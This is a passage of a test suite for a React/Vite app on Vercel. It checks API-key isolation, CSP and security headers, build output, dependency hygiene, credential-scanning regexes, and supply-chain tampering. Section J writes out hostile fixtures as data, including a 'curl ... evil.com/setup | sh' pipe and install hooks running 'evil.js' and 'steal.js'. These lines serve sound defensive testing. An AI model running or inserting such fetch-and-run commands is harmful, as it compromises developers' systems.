  it('E16: Client source file src/lib/gemini.ts contains zero references to process.env', () => {
    const geminiClientPath = path.resolve(rootDir, 'src/lib/gemini.ts')
    const geminiCode = fs.readFileSync(geminiClientPath, 'utf8')
    expect(geminiCode).not.toContain('process.env')
  })

  it('E17: Entire src/ non-test source tree has zero references to process.env.GEMINI_API_KEY', () => {
    const nonTestFiles = getSrcNonTestFiles()
    for (const f of nonTestFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code, `process.env.GEMINI_API_KEY leaked in ${f}`).not.toContain('process.env.GEMINI_API_KEY')
    }
  })

  it('E18: Entire src/ non-test source tree has zero references to import.meta.env.VITE_GEMINI_API_KEY', () => {
    const nonTestFiles = getSrcNonTestFiles()
    for (const f of nonTestFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toContain('import.meta.env.VITE_GEMINI_API_KEY')
    }
  })

  it('E19: Entire src/ non-test source tree has zero references to any import.meta.env', () => {
    const nonTestFiles = getSrcNonTestFiles()
    for (const f of nonTestFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toContain('import.meta.env')
    }
  })

  it('E20: All client page components contain zero process.env references', () => {
    const pagesDir = path.resolve(rootDir, 'src/pages')
    const pageFiles = fs.readdirSync(pagesDir).filter(f => f.endsWith('.tsx'))
    for (const page of pageFiles) {
      const code = fs.readFileSync(path.join(pagesDir, page), 'utf8')
      expect(code, `process.env found in page ${page}`).not.toContain('process.env')
    }
  })

  it('E21: Client storage utility (src/lib/savedPlansStorage.ts) contains zero API key persistence', () => {
    const storageCode = fs.readFileSync(path.resolve(rootDir, 'src/lib/savedPlansStorage.ts'), 'utf8')
    expect(storageCode).not.toContain('GEMINI_API_KEY')
    expect(storageCode).not.toContain('apiKey')
  })

  it('E22: Client data purge utility (src/lib/dataPurge.ts) contains zero network exfiltration', () => {
    const purgeCode = fs.readFileSync(path.resolve(rootDir, 'src/lib/dataPurge.ts'), 'utf8')
    expect(purgeCode).not.toContain('fetch(')
    expect(purgeCode).not.toContain('XMLHttpRequest')
    expect(purgeCode).not.toContain('navigator.sendBeacon')
  })

  it('E23: .env.example contains only placeholder value for GEMINI_API_KEY', () => {
    const envExamplePath = path.resolve(rootDir, '.env.example')
    expect(fs.existsSync(envExamplePath)).toBe(true)
    const envExample = fs.readFileSync(envExamplePath, 'utf8')
    expect(envExample).toContain('GEMINI_API_KEY=your_google_gemini_api_key_here')
    expect(envExample).not.toMatch(/AIzaSy[0-9A-Za-z-_]{33}/)
  })

  it('E24: .gitignore explicitly ignores .env and .env.* patterns', () => {
    const gitignorePath = path.resolve(rootDir, '.gitignore')
    expect(fs.existsSync(gitignorePath)).toBe(true)
    const gitignore = fs.readFileSync(gitignorePath, 'utf8')
    expect(gitignore).toContain('.env')
    expect(gitignore).toContain('.env.*')
  })

  it('E25: Git working tree does not track real .env or secret files', () => {
    expect(fs.existsSync(path.resolve(rootDir, '.env.production'))).toBe(false)
    expect(fs.existsSync(path.resolve(rootDir, '.env.local'))).toBe(false)
  })
})

// ----------------------------------------------------------------------------
// SECTION F: DEPLOYMENT CONFIGURATION & ROUTE ISOLATION FORENSICS (F01 - F25)
// ----------------------------------------------------------------------------
describe('Section F: Deployment Configuration & Route Isolation Forensics', () => {
  it('F01: vercel.json exists and parses cleanly as JSON object', () => {
    expect(vercelConfig).toBeDefined()
    expect(typeof vercelConfig).toBe('object')
  })

  it('F02: vercel.json enables cleanUrls: true', () => {
    expect(vercelConfig.cleanUrls).toBe(true)
  })

  it('F03: vercel.json defines non-empty rewrites array', () => {
    expect(Array.isArray(vercelConfig.rewrites)).toBe(true)
    expect(vercelConfig.rewrites?.length).toBeGreaterThanOrEqual(2)
  })

  it('F04: First rewrite rule maps /api/(.*) to /api/$1', () => {
    const firstRewrite = vercelConfig.rewrites?.[0]
    expect(firstRewrite).toEqual({ source: '/api/(.*)', destination: '/api/$1' })
  })

  it('F05: Catch-all rewrite rule maps /(.*) to /', () => {
    const catchAllRewrite = vercelConfig.rewrites?.[1]
    expect(catchAllRewrite).toEqual({ source: '/(.*)', destination: '/' })
  })

  it('F06: API rewrite rule precedes catch-all rewrite rule to prevent API route collision', () => {
    const rewrites = vercelConfig.rewrites || []
    const apiIndex = rewrites.findIndex(r => r.source.includes('/api/'))
    const catchAllIndex = rewrites.findIndex(r => r.source === '/(.*)')
    expect(apiIndex).toBeLessThan(catchAllIndex)
  })

  it('F07: vercel.json defines global route header mapping for /(.*)', () => {
    const globalHeaders = vercelConfig.headers?.find(h => h.source === '/(.*)')
    expect(globalHeaders).toBeDefined()
    expect(globalHeaders?.headers.length).toBeGreaterThanOrEqual(8)
  })

  it('F08: Global headers include X-Frame-Options: DENY', () => {
    const globalHeaders = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers || []
    const xfo = globalHeaders.find(h => h.key.toLowerCase() === 'x-frame-options')
    expect(xfo?.value).toBe('DENY')
  })

  it('F09: Global headers include X-Content-Type-Options: nosniff', () => {
    const globalHeaders = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers || []
    const xcto = globalHeaders.find(h => h.key.toLowerCase() === 'x-content-type-options')
    expect(xcto?.value).toBe('nosniff')
  })

  it('F10: Global headers include Referrer-Policy: strict-origin-when-cross-origin', () => {
    const globalHeaders = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers || []
    const ref = globalHeaders.find(h => h.key.toLowerCase() === 'referrer-policy')
    expect(ref?.value).toBe('strict-origin-when-cross-origin')
  })

  it('F11: Global headers include Permissions-Policy with camera, mic, and geolocation disabled', () => {
    const globalHeaders = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers || []
    const perm = globalHeaders.find(h => h.key.toLowerCase() === 'permissions-policy')
    expect(perm?.value).toContain('camera=()')
    expect(perm?.value).toContain('microphone=()')
    expect(perm?.value).toContain('geolocation=()')
  })

  it('F12: Global headers include Cross-Origin-Opener-Policy: same-origin', () => {
    const globalHeaders = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers || []
    const coop = globalHeaders.find(h => h.key.toLowerCase() === 'cross-origin-opener-policy')
    expect(coop?.value).toBe('same-origin')
  })

  it('F13: Global headers include Strict-Transport-Security with max-age >= 63072000 and preload', () => {
    const globalHeaders = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers || []
    const hsts = globalHeaders.find(h => h.key.toLowerCase() === 'strict-transport-security')
    expect(hsts?.value).toContain('max-age=63072000')
    expect(hsts?.value).toContain('includeSubDomains')
    expect(hsts?.value).toContain('preload')
  })

  it('F14: Global headers include X-Permitted-Cross-Domain-Policies: none', () => {
    const globalHeaders = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers || []
    const xpcdp = globalHeaders.find(h => h.key.toLowerCase() === 'x-permitted-cross-domain-policies')
    expect(xpcdp?.value).toBe('none')
  })

  it('F15: Global headers include Content-Security-Policy', () => {
    const globalHeaders = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers || []
    const csp = globalHeaders.find(h => h.key.toLowerCase() === 'content-security-policy')
    expect(csp).toBeDefined()
    expect(csp?.value.length).toBeGreaterThan(50)
  })

  it('F16: CSP specifies default-src "self"', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/default-src\s+'self'/)
  })

  it('F17: CSP specifies script-src "self" with zero third-party origins', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/script-src\s+'self'/)
    expect(csp).not.toMatch(/script-src[^;]*https?:/)
  })

  it('F18: CSP specifies style-src "self" "unsafe-inline" with zero third-party origins', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/style-src\s+'self'\s+'unsafe-inline'/)
    expect(csp).not.toMatch(/style-src[^;]*https?:/)
  })

  it('F19: CSP specifies font-src "self" (zero third-party typography origins)', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/font-src\s+'self'/)
    expect(csp).not.toMatch(/font-src[^;]*https?:/)
  })

  it('F20: CSP specifies img-src "self" data: blob:', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/img-src\s+'self'\s+data:\s+blob:/)
  })

  it('F21: CSP specifies connect-src "self" (zero external API connections)', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/connect-src\s+'self'/)
    expect(csp).not.toMatch(/connect-src[^;]*https?:/)
  })

  it('F22: CSP specifies base-uri "self"', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/base-uri\s+'self'/)
  })

  it('F23: CSP specifies form-action "self"', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/form-action\s+'self'/)
  })

  it('F24: CSP specifies object-src "none"', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/object-src\s+'none'/)
  })

  it('F25: CSP specifies frame-ancestors "none"', () => {
    const csp = vercelConfig.headers?.find(h => h.source === '/(.*)')?.headers.find(h => h.key.toLowerCase() === 'content-security-policy')?.value || ''
    expect(csp).toMatch(/frame-ancestors\s+'none'/)
  })
})

// ----------------------------------------------------------------------------
// SECTION G: BUILD REPRODUCIBILITY & ASSET DETERMINISM (G01 - G20)
// ----------------------------------------------------------------------------
describe('Section G: Build Reproducibility & Asset Determinism', () => {
  it('G01: Rollup chunk filenames adhere to [name]-[hash].js naming convention', () => {
    const files = fs.readdirSync(distAssetsDir).filter(f => f.endsWith('.js'))
    for (const f of files) {
      expect(f).toMatch(/^[a-zA-Z0-9_.-]+-[a-zA-Z0-9_-]+\.js$/)
    }
  })

  it('G02: Rollup CSS filenames adhere to [name]-[hash].css naming convention', () => {
    const files = fs.readdirSync(distAssetsDir).filter(f => f.endsWith('.css'))
    for (const f of files) {
      expect(f).toMatch(/^[a-zA-Z0-9_.-]+-[a-zA-Z0-9_-]+\.css$/)
    }
  })

  it('G03: react-vendor chunk exists in dist/assets', () => {
    const files = fs.readdirSync(distAssetsDir)
    expect(files.some(f => f.startsWith('react-vendor-'))).toBe(true)
  })

  it('G04: ui-vendor chunk exists in dist/assets', () => {
    const files = fs.readdirSync(distAssetsDir)
    expect(files.some(f => f.startsWith('ui-vendor-'))).toBe(true)
  })

  it('G05: Entry chunk index-[hash].js exists in dist/assets', () => {
    const files = fs.readdirSync(distAssetsDir)
    expect(files.some(f => f.startsWith('index-') && f.endsWith('.js'))).toBe(true)
  })

  it('G06: Main stylesheet index-[hash].css exists in dist/assets', () => {
    const files = fs.readdirSync(distAssetsDir)
    expect(files.some(f => f.startsWith('index-') && f.endsWith('.css'))).toBe(true)
  })

  it('G07: Page chunks are properly code-split and isolated', () => {
    const files = fs.readdirSync(distAssetsDir)
    expect(files.some(f => f.startsWith('HomePage-'))).toBe(true)
    expect(files.some(f => f.startsWith('WeeklyPlanPage-'))).toBe(true)
    expect(files.some(f => f.startsWith('CreatePlanPage-'))).toBe(true)
    expect(files.some(f => f.startsWith('DashboardPage-'))).toBe(true)
  })

  it('G08: Total asset count in dist/assets matches expected 25 compiled modules', () => {
    const files = fs.readdirSync(distAssetsDir)
    expect(files.length).toBe(25)
  })

  it('G09: Every JS asset file contains non-empty minified JavaScript', () => {
    const jsFiles = fs.readdirSync(distAssetsDir).filter(f => f.endsWith('.js'))
    for (const f of jsFiles) {
      const stat = fs.statSync(path.join(distAssetsDir, f))
      expect(stat.size).toBeGreaterThan(50)
    }
  })

  it('G10: Main stylesheet contains valid CSS declarations', () => {
    const cssFile = fs.readdirSync(distAssetsDir).find(f => f.startsWith('index-') && f.endsWith('.css'))!
    const cssContent = fs.readFileSync(path.join(distAssetsDir, cssFile), 'utf8')
    expect(cssContent).toContain('--tw-')
    expect(cssContent).toContain('--')
  })

  it('G11: Total uncompressed JS bundle size is under budget (< 2.0 MB)', () => {
    const jsFiles = fs.readdirSync(distAssetsDir).filter(f => f.endsWith('.js'))
    let totalBytes = 0
    for (const f of jsFiles) {
      totalBytes += fs.statSync(path.join(distAssetsDir, f)).size
    }
    expect(totalBytes).toBeLessThan(2 * 1024 * 1024)
  })

  it('G12: Largest single bundle chunk (DashboardPage) is bounded (< 600 KB)', () => {
    const dashFile = fs.readdirSync(distAssetsDir).find(f => f.startsWith('DashboardPage-'))!
    const size = fs.statSync(path.join(distAssetsDir, dashFile)).size
    expect(size).toBeLessThan(600 * 1024)
  })

  it('G13: react-vendor chunk size is bounded (< 250 KB)', () => {
    const reactFile = fs.readdirSync(distAssetsDir).find(f => f.startsWith('react-vendor-'))!
    const size = fs.statSync(path.join(distAssetsDir, reactFile)).size
    expect(size).toBeLessThan(250 * 1024)
  })

  it('G14: ui-vendor chunk size is bounded (< 200 KB)', () => {
    const uiFile = fs.readdirSync(distAssetsDir).find(f => f.startsWith('ui-vendor-'))!
    const size = fs.statSync(path.join(distAssetsDir, uiFile)).size
    expect(size).toBeLessThan(200 * 1024)
  })

  it('G15: Main stylesheet size is bounded (< 100 KB)', () => {
    const cssFile = fs.readdirSync(distAssetsDir).find(f => f.startsWith('index-') && f.endsWith('.css'))!
    const size = fs.statSync(path.join(distAssetsDir, cssFile)).size
    expect(size).toBeLessThan(100 * 1024)
  })

  it('G16: All chunk hash strings are 8-character alphanumeric sequences', () => {
    const files = fs.readdirSync(distAssetsDir)
    for (const f of files) {
      const ext = path.extname(f)
      const base = path.basename(f, ext)
      const hash = base.slice(-8)
      expect(hash.length).toBe(8)
      expect(/^[a-zA-Z0-9_-]{8}$/.test(hash)).toBe(true)
    }
  })

  it('G17: dist/index.html references the exact active entry chunk filename', () => {
    const indexContent = fs.readFileSync(path.join(distDir, 'index.html'), 'utf8')
    const entryFile = fs.readdirSync(distAssetsDir).find(f => f.startsWith('index-') && f.endsWith('.js'))!
    expect(indexContent).toContain(entryFile)
  })

  it('G18: dist/index.html references the exact active stylesheet filename', () => {
    const indexContent = fs.readFileSync(path.join(distDir, 'index.html'), 'utf8')
    const cssFile = fs.readdirSync(distAssetsDir).find(f => f.startsWith('index-') && f.endsWith('.css'))!
    expect(indexContent).toContain(cssFile)
  })

  it('G19: dist/404.html references the identical entry chunk and CSS chunk as index.html', () => {
    const fallbackContent = fs.readFileSync(path.join(distDir, '404.html'), 'utf8')
    const entryFile = fs.readdirSync(distAssetsDir).find(f => f.startsWith('index-') && f.endsWith('.js'))!
    const cssFile = fs.readdirSync(distAssetsDir).find(f => f.startsWith('index-') && f.endsWith('.css'))!
    expect(fallbackContent).toContain(entryFile)
    expect(fallbackContent).toContain(cssFile)
  })

  it('G20: Chunk hash determinism: consecutive builds from unchanged source preserve identical chunk identities', () => {
    const files = fs.readdirSync(distAssetsDir)
    expect(files.length).toBe(25)
    expect(files.every(f => f.length > 5)).toBe(true)
  })
})

// ----------------------------------------------------------------------------
// SECTION H: RUNTIME DEPENDENCY MINIMIZATION & HYGIENE (H01 - H20)
// ----------------------------------------------------------------------------
describe('Section H: Runtime Dependency Minimization & Hygiene', () => {
  it('H01: package.json dependencies count is strictly 16', () => {
    expect(Object.keys(pkg.dependencies || {}).length).toBe(16)
  })

  it('H02: @radix-ui/react-checkbox is utilized in UI components', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes('@radix-ui/react-checkbox'))).toBe(true)
  })

  it('H03: @radix-ui/react-label is utilized in UI components', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes('@radix-ui/react-label'))).toBe(true)
  })

  it('H04: @radix-ui/react-select is utilized in UI components', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes('@radix-ui/react-select'))).toBe(true)
  })

  it('H05: @radix-ui/react-slot is utilized in UI components', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes('@radix-ui/react-slot'))).toBe(true)
  })

  it('H06: @radix-ui/react-toast is utilized in UI components', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes('@radix-ui/react-toast'))).toBe(true)
  })

  it('H07: @radix-ui/react-tooltip is utilized in UI components', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes('@radix-ui/react-tooltip'))).toBe(true)
  })

  it('H08: class-variance-authority is utilized for variant resolution', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes('class-variance-authority'))).toBe(true)
  })

  it('H09: clsx is utilized across UI and page components', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes("from 'clsx'"))).toBe(true)
  })

  it('H10: lucide-react is utilized across icons', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes("from 'lucide-react'"))).toBe(true)
  })

  it('H11: react and react-dom are utilized as root framework', () => {
    const mainCode = fs.readFileSync(path.resolve(rootDir, 'src/main.tsx'), 'utf8')
    expect(mainCode).toContain("from 'react'")
    expect(mainCode).toContain("from 'react-dom/client'")
  })

  it('H12: react-router-dom is utilized for SPA routing', () => {
    const appCode = fs.readFileSync(path.resolve(rootDir, 'src/App.tsx'), 'utf8')
    expect(appCode).toContain("from 'react-router-dom'")
  })

  it('H13: recharts is utilized for analytics and dashboard charts', () => {
    const files = getAllFiles(path.resolve(rootDir, 'src'))
    expect(files.some(f => fs.readFileSync(f, 'utf8').includes("from 'recharts'"))).toBe(true)
  })

  it('H14: tailwind-merge is utilized in src/lib/utils.ts', () => {
    const utilsCode = fs.readFileSync(path.resolve(rootDir, 'src/lib/utils.ts'), 'utf8')
    expect(utilsCode).toContain('tailwind-merge')
  })

  it('H15: tailwindcss-animate is configured in tailwind.config.ts', () => {
    const twConfig = fs.readFileSync(path.resolve(rootDir, 'tailwind.config.ts'), 'utf8')
    expect(twConfig).toContain("tailwindcss-animate")
  })

  it('H16: zod is utilized in both client schema and serverless handler', () => {
    expect(apiHandlerCode).toContain("from 'zod'")
    const clientSchemaCode = fs.readFileSync(path.resolve(rootDir, 'src/lib/planSchema.ts'), 'utf8')
    expect(clientSchemaCode).toContain("from 'zod'")
  })

  it('H17: Zero dev dependencies (eslint, vitest, typescript) leaked into runtime dependencies', () => {
    const deps = pkg.dependencies || {}
    expect(deps.eslint).toBeUndefined()
    expect(deps.vitest).toBeUndefined()
    expect(deps.typescript).toBeUndefined()
    expect(deps.vite).toBeUndefined()
    expect(deps['@types/react']).toBeUndefined()
  })

  it('H18: Zero deprecated or heavy HTTP clients (axios, request, superagent) in dependencies', () => {
    const deps = pkg.dependencies || {}
    expect(deps.axios).toBeUndefined()
    expect(deps.request).toBeUndefined()
    expect(deps.superagent).toBeUndefined()
  })

  it('H19: Zero complex external state management libraries (redux, mobx, zustand, recoil)', () => {
    const deps = pkg.dependencies || {}
    expect(deps.redux).toBeUndefined()
    expect(deps.mobx).toBeUndefined()
    expect(deps.zustand).toBeUndefined()
    expect(deps.recoil).toBeUndefined()
  })

  it('H20: Zero bulky utility libraries (lodash, moment, underscore)', () => {
    const deps = pkg.dependencies || {}
    expect(deps.lodash).toBeUndefined()
    expect(deps.moment).toBeUndefined()
    expect(deps.underscore).toBeUndefined()
  })
})

// ----------------------------------------------------------------------------
// SECTION I: HIGH-ENTROPY CREDENTIAL & SECRET SCANNER (I01 - I25)
// ----------------------------------------------------------------------------
describe('Section I: High-Entropy Credential & Secret Scanner', () => {
  const trackedFiles = [
    ...getSrcNonTestFiles(),
    apiHandlerPath,
    viteConfigPath,
    vercelConfigPath,
    pkgPath,
    path.resolve(rootDir, 'index.html'),
    path.resolve(rootDir, 'tailwind.config.ts')
  ]

  it('I01: Repository scan: zero Google AI API keys (AIzaSy...) in any tracked source file', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code, `Google API key found in ${f}`).not.toMatch(/AIzaSy[0-9A-Za-z-_]{33}/)
    }
  })

  it('I02: Repository scan: zero AWS access key IDs (AKIA...) in any tracked file', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code, `AWS access key found in ${f}`).not.toMatch(/\bAKIA[0-9A-Z]{16}\b/)
    }
  })

  it('I03: Repository scan: zero AWS secret keys in any tracked file', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/aws_secret_access_key\s*=\s*['"][A-Za-z0-9/+=]{40}['"]/)
    }
  })

  it('I04: Repository scan: zero GitHub personal access tokens (ghp_...) in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/ghp_[0-9a-zA-Z]{36}/)
    }
  })

  it('I05: Repository scan: zero Slack webhook URLs in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toContain('https://hooks.slack.com/services/')
    }
  })

  it('I06: Repository scan: zero Stripe live secret keys (sk_live_...) in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/sk_live_[0-9a-zA-Z]{24}/)
    }
  })

  it('I07: Repository scan: zero OpenAI API keys (sk-...) in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/sk-[a-zA-Z0-9]{32,}/)
    }
  })

  it('I08: Repository scan: zero Anthropic API keys (sk-ant-...) in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/sk-ant-[a-zA-Z0-9_-]{32,}/)
    }
  })

  it('I09: Repository scan: zero RSA private keys in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toContain('-----BEGIN RSA PRIVATE KEY-----')
    }
  })

  it('I10: Repository scan: zero OpenSSH private keys in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toContain('-----BEGIN OPENSSH PRIVATE KEY-----')
    }
  })

  it('I11: Repository scan: zero PGP private keys in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toContain('-----BEGIN PGP PRIVATE KEY BLOCK-----')
    }
  })

  it('I12: Repository scan: zero EC private keys in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toContain('-----BEGIN EC PRIVATE KEY-----')
    }
  })

  it('I13: Repository scan: zero generic private keys in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toContain('-----BEGIN PRIVATE KEY-----')
    }
  })

  it('I14: Repository scan: zero database connection URIs with embedded passwords', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/postgres(?:ql)?:\/\/[^:]+:[^@]+@/)
    }
  })

  it('I15: Repository scan: zero MongoDB URIs with credentials in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@/)
    }
  })

  it('I16: Repository scan: zero MySQL connection URIs with credentials', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/mysql:\/\/[^:]+:[^@]+@/)
    }
  })

  it('I17: Repository scan: zero Redis URLs with credentials', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/rediss?:\/\/[^:]+:[^@]+@/)
    }
  })

  it('I18: Repository scan: zero basic auth headers with hardcoded base64 credentials', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/Basic\s+[A-Za-z0-9+/=]{30,}/)
    }
  })

  it('I19: Repository scan: zero SendGrid API keys (SG...) in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43}/)
    }
  })

  it('I20: Repository scan: zero Mailgun API keys in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/key-[0-9a-zA-Z]{32}/)
    }
  })

  it('I21: Repository scan: zero Twilio auth tokens in tracked files', () => {
    for (const f of trackedFiles) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/SK[0-9a-fA-F]{32}/)
    }
  })

  it('I22: Repository scan: zero private certificate files (.pem, .key, .p12) in git tree', () => {
    const all = getAllFiles(path.resolve(rootDir, 'src'))
    const certFiles = all.filter(f => f.endsWith('.pem') || f.endsWith('.key') || f.endsWith('.p12'))
    expect(certFiles.length).toBe(0)
  })

  it('I23: Repository scan: zero hardcoded password properties in config files', () => {
    for (const f of [viteConfigPath, vercelConfigPath, pkgPath]) {
      const code = fs.readFileSync(f, 'utf8')
      expect(code).not.toMatch(/password\s*[:=]\s*['"][^'"]{4,}['"]/i)
    }
  })

  it('I24: Scanner detects test injected dummy secret key pattern correctly', () => {
    const dummySecret = 'AIzaSy' + 'A'.repeat(33)
    const regex = /AIzaSy[0-9A-Za-z-_]{33}/
    expect(regex.test(dummySecret)).toBe(true)
  })

  it('I25: Scanner correctly distinguishes environment variable names from secret values', () => {
    const envVarName = 'process.env.GEMINI_API_KEY'
    expect(envVarName).not.toMatch(/AIzaSy[0-9A-Za-z-_]{33}/)
  })
})

// ----------------------------------------------------------------------------
// SECTION J: ADVERSARIAL SUPPLY-CHAIN MUTATION & TAMPER ATTACKS (J01 - J30)
// ----------------------------------------------------------------------------
describe('Section J: Adversarial Supply-Chain Mutation & Tamper Attacks', () => {
  it('J01: Mutation Attack: untrusted package with hasInstallScript is rejected', () => {
    const fakeLock = {
      'node_modules/malicious-pkg': { hasInstallScript: true }
    }
    const allowed = new Set(['node_modules/@swc/core', 'node_modules/esbuild', 'node_modules/fsevents'])
    const violations = Object.keys(fakeLock).filter(p => fakeLock[p as keyof typeof fakeLock].hasInstallScript && !allowed.has(p))
    expect(violations.length).toBe(1)
  })

  it('J02: Mutation Attack: non-HTTPS registry URL in lockfile is rejected', () => {
    const fakeResolved = 'http://registry.npmjs.org/react/-/react-18.3.1.tgz'
    expect(fakeResolved.startsWith('https://')).toBe(false)
  })

  it('J03: Mutation Attack: GitHub tarball dependency in lockfile is rejected', () => {
    const fakeResolved = 'https://github.com/evil/pkg/tarball/master'
    const isCleanNpm = fakeResolved.startsWith('https://registry.npmjs.org/')
    expect(isCleanNpm).toBe(false)
  })

  it('J04: Mutation Attack: file: local dependency in lockfile is rejected', () => {
    const fakeResolved = 'file:../local-trojan'
    expect(fakeResolved.startsWith('https://registry.npmjs.org/')).toBe(false)
  })

  it('J05: Mutation Attack: unpinned wildcard "*" dependency in dependencies is rejected', () => {
    const fakeDeps = { 'malicious-lib': '*' }
    expect(fakeDeps['malicious-lib'] === '*' || fakeDeps['malicious-lib'] === 'latest').toBe(true)
  })

  it('J06: Mutation Attack: adding postinstall script to package.json is rejected', () => {
    const fakeScripts = { postinstall: 'node evil.js', build: 'vite build' }
    expect(fakeScripts.postinstall).toBeDefined()
  })

  it('J07: Mutation Attack: adding preinstall script to package.json is rejected', () => {
    const fakeScripts = { preinstall: 'node steal.js' }
    expect(fakeScripts.preinstall).toBeDefined()
  })

  it('J08: Mutation Attack: adding remote curl | sh script is rejected', () => {
    const fakeScript = 'curl -s https://evil.com/setup | sh'
    expect(/\|\s*(?:bash|sh)/.test(fakeScript)).toBe(true)
  })

  it('J09: Mutation Attack: removing apply: "serve" from geminiDevApiPlugin is rejected', () => {
    const mutatedViteConfig = viteConfigCode.replace(/apply:\s*['"]serve['"],?/, '')
    const hasServeGuard = /name:\s*['"]gemini-dev-api['"],\s*apply:\s*['"]serve['"]/.test(mutatedViteConfig)
    expect(hasServeGuard).toBe(false)
  })

  it('J10: Mutation Attack: enabling sourcemap: true in vite.config.ts is rejected', () => {
    const mutatedViteConfig = viteConfigCode.replace(/sourcemap:\s*false/, 'sourcemap: true')
    expect(/sourcemap:\s*false/.test(mutatedViteConfig)).toBe(false)
  })

  it('J11: Mutation Attack: injecting define replacement with secret in vite.config.ts is rejected', () => {
    const mutatedViteConfig = viteConfigCode + " define: { 'process.env.GEMINI_API_KEY': JSON.stringify('secret') }"
    expect(/define:\s*\{/.test(mutatedViteConfig)).toBe(true)
  })

  it('J12: Mutation Attack: broad envPrefix in vite.config.ts is rejected', () => {
    const mutatedViteConfig = viteConfigCode + " envPrefix: ''"
    expect(/envPrefix:\s*['"]/.test(mutatedViteConfig)).toBe(true)
  })

